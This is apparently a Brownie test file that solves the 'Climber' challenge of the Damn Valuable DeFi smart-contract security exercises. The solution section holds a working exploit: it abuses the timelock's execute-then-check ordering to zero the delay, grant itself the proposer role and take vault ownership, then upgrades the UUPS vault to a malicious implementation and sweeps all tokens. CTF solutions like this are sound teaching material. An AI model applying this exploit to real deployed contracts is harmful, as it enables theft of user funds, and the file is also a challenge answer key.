from scripts.utils import *
from brownie import ClimberTimelock, ClimberVault, DamnValuableToken

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # Vault starts with 10 million tokens
    VAULT_TOKEN_BALANCE = ether_to_wei(10000000)

    # import accounts
    deployer, _fromDeployer, proposer, _fromProposer, sweeper, _fromSweeper, attacker, _fromAttacker = define_from_acc(qty=4)

    # set attacker balance to 0.1 ETH
    set_account_balance_network(attacker.address, hex(ether_to_wei(0.1)))
    # check attacker balance
    assert attacker.balance() == ether_to_wei(0.1)

    # Deploy the vault behind a proxy using the UUPS pattern,
    # passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    ERC1967ProxyABI, ERC1967ProxyBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-erc-1967-proxy/ERC1967Proxy.json')
    vault = ClimberVault.deploy(_fromDeployer)
    initialization_data = vault.initialize.encode_input(deployer.address, proposer.address, sweeper.address)
    proxy = load_contract_from_abi_and_bytecode('ERC1967Proxy', ERC1967ProxyABI, ERC1967ProxyBytecode, constructor_params=[(vault.address, 'address'), (initialization_data, 'bytes')])
    proxy_vault = Contract.from_abi("Vault", proxy.address, vault.abi)

    # check if everything is set up properly
    assert proxy_vault.getSweeper() == sweeper.address
    assert proxy_vault.getLastWithdrawalTimestamp() > 0
    assert proxy_vault.owner() != ZERO_ADDRESS
    assert proxy_vault.owner() != deployer.address

    # Instantiate timelock
    timelockAddress = proxy_vault.owner()
    timelock = ClimberTimelock.at(timelockAddress)
        
    # Ensure timelock roles are correctly initialized
    assert timelock.hasRole(timelock.PROPOSER_ROLE(), proposer.address) == True
    assert timelock.hasRole(timelock.ADMIN_ROLE(), deployer.address) == True

    # Deploy token and transfer initial token balance to the vault
    token = DamnValuableToken.deploy(_fromDeployer)
    token.transfer(proxy_vault.address, VAULT_TOKEN_BALANCE, _fromDeployer)

    # check the balance is correct
    assert token.balanceOf(proxy_vault.address) == VAULT_TOKEN_BALANCE

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        assert token.balanceOf(proxy_vault.address) == 0
        assert token.balanceOf(attacker.address) == VAULT_TOKEN_BALANCE

# #########################################################
# There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.
#
# The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
#
# On the vault there's an additional role with powers to sweep all tokens in case of an emergency.
#
# On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.
#
# Your goal is to empty the vault. 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################
    from brownie import ClimberAttack, GetSelector, ClimberUpgrade
    
    # web3
    web3 = import_web3()

    # contract to get function selectors
    get_selector = GetSelector.deploy(_fromAttacker)
    gs = lambda func: get_selector.getSelector(func)

    # deploy attacker contract
    attacker_contract = ClimberAttack.deploy(timelock.address, _fromAttacker)

    # targets, values, dataElements and salt of the call
    targets = [timelock.address, timelock.address, proxy_vault.address, attacker_contract.address]
    values = [0, 0, 0, 0]
    dataElements = [timelock.updateDelay.encode_input(0),
        gs('grantRole(bytes32,address)').hex() + timelock.PROPOSER_ROLE().hex() + '0'*24 + attacker_contract.address[2:],
        gs('transferOwnership(address)').hex() + '0'*24 + attacker.address[2:],
        gs('schedule()').hex()]
    salt = web3.solidityKeccak(['string'],['0'])
    for element in dataElements:
        print(element)
    # malicious execute call (remove function selector, as it's not needed)
    malicious_call = timelock.execute.encode_input(
        targets,
        values,
        dataElements,
        salt
    )[10:]
    print(malicious_call)

    # perform malicious call
    attacker_contract.attack(malicious_call, _fromAttacker)

    # deploy upgrade contract
    upgrade_contract = ClimberUpgrade.deploy(_fromAttacker)

    # upgrade the vault contract implementation
    proxy_vault.upgradeTo(upgrade_contract.address, _fromAttacker)

    # sweep the funds
    proxy_vault.sweepFunds(token.address, _fromAttacker)

    ######################
    check_solution()
